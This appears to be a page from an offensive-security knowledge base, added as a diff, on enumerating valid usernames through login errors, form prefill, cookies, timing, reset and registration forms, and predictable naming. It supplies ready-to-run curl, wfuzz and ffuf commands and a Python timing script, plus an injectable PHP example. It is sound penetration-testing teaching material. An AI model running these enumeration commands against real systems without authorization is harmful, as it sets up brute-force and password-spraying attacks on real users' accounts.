@@ -1,0 +1,371 @@
+---
+title: Username enumeration
+description: Distinguishing valid from invalid users through response differences, timing, reset forms, registration forms, and predictable naming patterns.
+mitre: [T1589.002, T1078]
+d3fend: [D3-AH]
+impact: [CredentialTheft]
+owasp: [A07]
+sidebar:
+  order: 4
+  label: Username enumeration
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Five places an application leaks "this user exists":
+
+```
+# 1. Login error message differs
+"Unknown username"  vs.  "Invalid password for user X"
+
+# 2. Form prefill on submit (sticky field for valid users only)
+<input name="user" value="admin">    # form preserves valid usernames
+<input name="user" value="">          # form clears unknown usernames
+
+# 3. Response timing differs (password hashing only runs for valid users)
+admin     → 263ms       guest     → 5ms
+nonexistent → 3ms       randomXXX → 4ms
+
+# 4. Password-reset flow differs
+"Email sent to admin@example.com"  vs.  "Username not found"
+
+# 5. Registration form rejects taken names
+"That username is already in use" → that username exists
+```
+
+Success indicator: one or more usernames confirmed valid, ready to target with brute-force or password spraying.
+
+## Why bother
+
+Username enumeration is the cheap prerequisite to almost everything else in this section. Once you have a list of valid usernames:
+
+- Targeted brute-force ([Password policy](/codex/web/auth/password-policy/)) becomes feasible on just those users
+- Password spraying (one common password, many users) becomes precise
+- Reset-token attacks ([Reset tokens](/codex/web/auth/reset-tokens/)) need a username to start
+- Username injection ([Username injection](/codex/web/auth/username-injection/)) needs a target user
+- OSINT and phishing have a target list
+
+Most defenses are pitched at "preventing the brute-force." The username-enumeration leak almost always comes free with whatever defense isn't.
+
+## Method 1 - User-unknown error message
+
+The classic. Application replies differently for "user doesn't exist" vs. "user exists but wrong password."
+
+### Detection
+
+```bash
+# Submit with a definitely-fake user and an obviously-wrong password
+curl -s -X POST -d "user=zzzzzzzz9999&pass=wrong" https://<TARGET>/login > /tmp/r-unknown
+
+# Submit with a probable user (admin) and an obviously-wrong password
+curl -s -X POST -d "user=admin&pass=wrong" https://<TARGET>/login > /tmp/r-admin
+
+# Diff
+diff /tmp/r-unknown /tmp/r-admin
+```
+
+Differences to look for:
+- Error message text ("Unknown username" / "Incorrect password")
+- Number of error elements (one error block vs. two)
+- HTTP status code (rare but happens - 401 for known user, 404 for unknown)
+- Set-Cookie header (some apps set a "failed attempt" cookie only for valid users)
+
+### Exploitation
+
+Once a divergence is identified, brute-force the username list against the divergence signal:
+
+```bash
+# wfuzz hiding the "Unknown username" response
+wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt \
+      -d "Username=FUZZ&Password=dummypass" \
+      --hs "Unknown username" \
+      https://<TARGET>/login.php
+```
+
+The `--hs` filter hides any response matching the "user not found" message. Everything that survives the filter is a valid username.
+
+`ffuf` equivalent:
+
+```bash
+ffuf -w /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt:UNAME \
+     -u https://<TARGET>/login.php \
+     -X POST -d "Username=UNAME&Password=dummypass" \
+     -fr "Unknown username"
+```
+
+## Method 2 - Form prefill inference
+
+Some applications return the login page with the submitted username preserved in the form field - but only if the username is valid:
+
+```html
+<!-- After submitting an existing username with wrong password -->
+<input type="text" name="username" value="admin">
+
+<!-- After submitting an unknown username -->
+<input type="text" name="username" value="">
+```
+
+This pattern appears most often in:
+- Mobile-optimized login pages (developers prioritized UX over leak prevention)
+- Old WordPress versions ([WP ticket #3708](https://core.trac.wordpress.org/ticket/3708) - preserved by design)
+- Custom apps with helpful UX
+
+### Detection
+
+```bash
+# Check whether the username gets echoed in the form
+curl -s -X POST -d "user=admin&pass=wrong" https://<TARGET>/login | grep -E 'name="user"'
+curl -s -X POST -d "user=nonexistent&pass=wrong" https://<TARGET>/login | grep -E 'name="user"'
+
+# If first prints value="admin" and second prints value="" → enumeration available
+```
+
+### Exploitation
+
+Filter on whether the response contains the submitted username:
+
+```bash
+# ffuf - only match responses where the submitted username appears in a value="..." field
+ffuf -w usernames.txt:UNAME \
+     -u https://<TARGET>/login \
+     -X POST -d "user=UNAME&pass=wrong" \
+     -mr 'value="UNAME"'                    # regex match in response
+```
+
+Note: some applications echo the submitted value regardless (for any UX reason), but with a marker indicating validity. Look for hidden fields, error class names, or input-error states - those distinguish valid from invalid where the value alone doesn't.
+
+A real example pattern from custom apps: the page source contains either:
+
+```html
+<input type="hidden" name="wronguser" value="admin">
+```
+
+…for invalid usernames (the app marks the attempt as a wrong username), or:
+
+```html
+<input type="hidden" name="validuser" value="admin">
+```
+
+…for valid usernames (the app marks the attempt as a wrong password against a known user). Filtering on `wronguser` vs. `validuser` enumerates the valid set.
+
+### Cookie-based inference
+
+A subtler variant - the application sets a different cookie based on validity:
+
+```bash
+# Valid username → cookie 'failed_login_count' increments
+# Invalid username → no cookie set
+
+curl -s -c - -X POST -d "user=admin&pass=wrong" https://<TARGET>/login | grep -i Set-Cookie
+curl -s -c - -X POST -d "user=nonexistent&pass=wrong" https://<TARGET>/login | grep -i Set-Cookie
+```
+
+If the cookie set differs, that's a signal - fuzz on Set-Cookie presence instead of response body.
+
+## Method 3 - Timing attacks
+
+When the application hashes the submitted password before comparison, valid users incur the hashing cost - invalid users don't (no password to hash against). The difference is observable.
+
+Vulnerable pattern (the `$result` from the user lookup gates whether hashing runs):
+
+```php
+$result = $db->query('SELECT * FROM users WHERE username="'.$user.'"');
+if ($result) {
+    $row = mysqli_fetch_row($result);
+    $cpass = hash_password($_POST['password']);   // ← only runs for valid users
+    if ($cpass === $row['cpassword']) { /* logged in */ }
+    else                              { /* invalid credentials */ }
+} else {
+    /* invalid credentials */                     // ← no hashing for invalid user
+}
+```
+
+### Detection
+
+```bash
+# Time a definitely-valid user (something obvious like admin or root)
+time curl -s -X POST -d "user=admin&pass=$(date +%s%N)" https://<TARGET>/login > /dev/null
+
+# Time a definitely-invalid user
+time curl -s -X POST -d "user=zzzzzzz9999&pass=$(date +%s%N)" https://<TARGET>/login > /dev/null
+```
+
+If the first takes consistently longer (50-500ms more, depending on the hashing algorithm), the application is leaking through timing.
+
+### Exploitation
+
+Time every candidate username and pick the outliers:
+
+```python
+import requests, time
+
+URL = "https://target.example.com/login"
+
+for username in open('/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt'):
+    username = username.strip()
+    times = []
+    for _ in range(5):                          # average 5 attempts to defeat jitter
+        start = time.time()
+        requests.post(URL, data={'user': username, 'pass': 'wrong'})
+        times.append(time.time() - start)
+    avg = sum(times) / len(times)
+    print(f"{username:20s} {avg:.3f}")
+```
+
+Look for the outliers. With bcrypt-grade hashing, valid users typically take 200-300ms while invalid users take 1-5ms - the gap is unmistakable. With faster algorithms (SHA1, MD5) the gap might be sub-millisecond and easily lost to network jitter; in that case, average many more samples and accept that some candidates will produce false positives.
+
+Sample output against a vulnerable app:
+
+```
+admin                 0.263
+root                  0.003
+test                  0.005
+guest                 0.003
+info                  0.001
+mysql                 0.001
+oracle                0.001
+```
+
+`admin` is the only outlier - clearly valid.
+
+### Defeating timing attack noise
+
+Network jitter, server CPU load, and HTTPS-handshake variation all add noise. Practical mitigations on the attacker side:
+- Average many samples (5-20 per candidate)
+- Filter outliers (drop top/bottom 10% before averaging)
+- Test from a host with low network latency to the target
+- Run during off-peak hours
+
+If the gap is comparable to the noise floor, the application is probably using fast hashing (MD5/SHA1) without significant computation - timing enumeration still works but needs much larger sample sizes.
+
+## Method 4 - Password reset leakage
+
+Reset forms are often less protected than login forms - they hand over information to "help" the user:
+
+```
+"An email has been sent to your address"         (valid user - message would actually be sent)
+"That username is not registered"                (invalid user)
+```
+
+Same response-diffing approach works:
+
+```bash
+ffuf -w usernames.txt:UNAME \
+     -u https://<TARGET>/forgot-password \
+     -X POST -d "user=UNAME" \
+     -fr "not registered"
+```
+
+**The cost of this attack**: actual reset emails get sent to actual users. Some users will notice and contact support. Use sparingly during stealth-required engagements; freely during loud engagements where the customer expects activity.
+
+### Hardened reset forms
+
+A reset form that always returns the same response regardless of username validity defeats this attack:
+
+```
+"If that username is registered, you will receive an email"     (no matter what)
+```
+
+When you see this generic message, the reset path likely doesn't enumerate - pivot to another method.
+
+## Method 5 - Registration form
+
+Self-registration almost always tells you when a username is taken:
+
+```
+"Sorry, that username is already in use. Choose another."
+```
+
+The registration form is also usually less protected than login (developers expect higher legitimate volume of registration attempts than login failures).
+
+### Exploitation
+
+```bash
+ffuf -w admin-usernames.txt:UNAME \
+     -u https://<TARGET>/register \
+     -X POST -d "user=UNAME&email=test@example.com&pass=AnythingValid1!" \
+     -mr "already in use"                       # match responses indicating the user exists
+```
+
+This approach has two costs:
+1. Loud - every attempt is a registration request, often visible to admins
+2. Creates accounts - even unsuccessful attempts may leave records
+
+### Sub-addressing for unlimited registrations
+
+Email sub-addressing (RFC 5233) lets you register many accounts with one mailbox:
+
+```
+attacker@example.com
+attacker+test1@example.com           ← delivered to attacker@example.com
+attacker+test2@example.com           ← delivered to attacker@example.com
+attacker+xxxxx@example.com           ← delivered to attacker@example.com
+```
+
+When the registration form accepts these (most do - sub-addressing is RFC-compliant), you can spin up arbitrary accounts during testing.
+
+## Method 6 - Predictable usernames
+
+When usernames follow a pattern, enumerate the pattern instead of dictionary-attacking:
+
+```
+user1000, user1001, user1002, ...        # sequential
+emp001, emp002, emp003, ...
+john.smith, jane.doe                     # first.last from a company directory
+support.us, support.eu, support.asia     # role-region pattern
+admin.gr, admin.it, admin.us             # role-countrycode pattern
+```
+
+Once you've identified one or two valid usernames through any other method, look for the pattern. If `support.us` exists, try `support.uk`, `support.de`, `support.fr`. If `emp001` exists, try `emp002` through `emp999`.
+
+### Generating predictable patterns
+
+```bash
+# Sequential
+seq -f 'user%04g' 1 9999 > /tmp/sequential.txt
+
+# Common role-country patterns
+roles="admin support helpdesk tech ops"
+countries="us uk de fr es it gr cn jp"
+for r in $roles; do for c in $countries; do echo "$r.$c"; done; done > /tmp/role-country.txt
+
+# Then fuzz the generated list
+ffuf -w /tmp/role-country.txt:UNAME \
+     -u https://<TARGET>/messages?to=UNAME \
+     -mr "user not found" -fmode and
+```
+
+A message-send feature is sometimes a better enumeration channel than the login itself - "user not found" responses are explicit and unrelated to authentication, so they often skip authentication-style rate-limiting.
+
+## Combining signals
+
+A real engagement usually mixes methods. Typical chain:
+
+1. Test login error response - gives 0 or 1 explicit leaks
+2. If no explicit leak, test timing - usually finds 1-3 candidates
+3. Confirm candidates via password-reset or message-send features
+4. Identify pattern from confirmed candidates
+5. Generate pattern-based list, enumerate the rest
+
+The skill-assessment-style chain from authentication training: "Support page mentions a 'support' user and other accounts by country code" → use the message-send feature to test `support.us`, `support.uk`, etc. → confirm valid ones → expand to `admin.us`, `admin.uk`, etc. on the same pattern.
+
+## Detection-only payloads
+
+```bash
+# Simple side-by-side comparison without committing to a full enumeration
+curl -s -X POST -d "user=admin&pass=wrong" https://<TARGET>/login | md5sum
+curl -s -X POST -d "user=zzzzzz&pass=wrong" https://<TARGET>/login | md5sum
+# Different MD5 = differing response = enumeration available
+```
+
+## Notes
+
+- **Hardened applications return identical responses for valid and invalid users.** Identical text, identical timing, identical cookies. When this is genuinely the case, enumeration is closed at this path - pivot to other paths.
+- **The cleanest detection-time signal is response equality.** Generate a few requests with known-fake and known-real (admin, root, your own account) and `diff` the responses. If they're identical bit-for-bit, enumeration through this endpoint is closed.
+- **Username enumeration is a CWE-203 issue (Observable Discrepancy).** OWASP doesn't separately enumerate username enumeration but folds it into A07 (Identification and Authentication Failures). Some bug bounty programs reject enumeration as low-severity; others reward it as an information disclosure.
+- **OSINT supplements enumeration.** Company employee names from LinkedIn, GitHub profiles, leaked databases. Combine with the application's username scheme (firstname.lastname, firstinitiallastname, etc.) for a high-quality targeted list before hitting the application at all.
+
+<Aside type="tip">
+Once you have valid usernames, the best next move depends on what's possible: targeted brute-force if password policy is weak (see [Password policy](/codex/web/auth/password-policy/)), password spraying with common passwords if multi-account access is the goal, or [reset tokens](/codex/web/auth/reset-tokens/) if you can bypass the password phase entirely.
+</Aside>
